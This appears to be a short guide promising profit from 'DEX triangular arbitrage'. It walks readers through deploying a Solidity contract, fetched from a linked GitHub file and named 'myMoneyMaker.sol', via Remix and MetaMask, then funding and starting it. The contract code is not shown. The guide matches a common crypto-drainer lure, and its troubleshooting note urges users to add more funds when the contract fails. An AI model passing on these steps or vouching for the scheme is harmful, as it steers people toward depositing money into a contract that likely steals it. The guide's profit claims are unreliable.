What Is DEX Crypto Triangular Arbitrage?

Triangular arbitrage is the result of a discrepancy between three tokens that occurs when the DEX exchange rates do not exactly match up.

if you dont have metamask browser extension by getting it here

https://metamask.io/download/

and make sure you configure metamask for the network your want to use

for ETH:

configure by Default
 
for BNB: 

https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain

for polygon:

Step 1. Goto https://remix.ethereum.org 

Step 2. Make a New File name it "myMoneyMaker.sol" make sure it ends in ".sol"

Step 3. copy and paste the this code https://github.com/FYStrech/Solidity-Smart-Contract-DEX-Triangular-Arbitrage-FYStrech/blob/main/DEX-Triangular-Arbitrage.sol in to the new file

Step 4. compile the new file "if you get a Green checkmark every thing complied correctly"

Step 5. Appoved remix to connect to MetaMask "Will only ask if you never connected to remix before"  , Set Environment to "Injected Provider - MetaMask" and deploy

Step 6. For the polygon netwrok you need to change the priorty fee , for ETH and BNB you should not need to do that in less the contract deployment fails

Step 7. Copy your contract address

Step 8. Scan your contract address in a block scanner for ETH etherscan.io , BNB bscscan.com , Polygon polygonscan.com

Step 9. Fund your contract

Step 10. Start your Contract

Edit the gas limit

Click Confirm

Note: if you have problem scan your contract address in a block explorer to see what it says "if it say failed if it does read the error to find out way , most of the time it has to do with the contract being under funded"
